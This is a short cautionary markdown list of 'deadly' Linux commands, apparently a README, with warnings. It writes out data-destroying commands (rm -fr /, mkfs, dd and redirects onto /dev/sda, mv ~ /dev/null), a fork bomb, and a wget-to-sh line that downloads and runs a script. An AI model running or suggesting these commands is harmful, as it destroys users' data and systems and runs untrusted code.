Deadly Linux
============

*Simple list of deadly linux commands. All the Linux that nobody will teach you, but that you will experience in first person. At least one time in your life.*

## Warning
Most of the commands in this tutorial are **really dangerous**!!!
DO NOT use these commands on a real system if you have no idea of what you are going to do.


### Delete Everything!

`rm -fr /`

With this command you asking to delete every files in your disk. Your only hope is that some security control will denied you to do something so silly.


### Fork Bomb

`:(){ :|: & };:`

Elegant and deadly as a dark-lady. This short shell script replicates itself until all the processing capabilities of your computer will be occupied. Shutdown and restart seems to be the only solution.


### Format the Drive

`mkfs.ext4 /dev/sda1`

Do you remember `format C:` of the old DOS? this have the same result.

### Writes Directly to a Hard Drive

`date > /dev/sda`

Redirecting will write raw bytes on your disk partition. What can never will be? nothing good! surely.


## Writes Junk Onto a Hard Drive

`dd if=/dev/random of=/dev/sda`


## Moves Your Home Directory to a Black Hole

`mv ~ /dev/null`


## Downloads and Runs a Script

`wget http://example.com/something -O – | sh –`


## References
* [How to Geek](http://www.howtogeek.com/125157/8-deadly-commands-you-should-never-run-on-linux/)
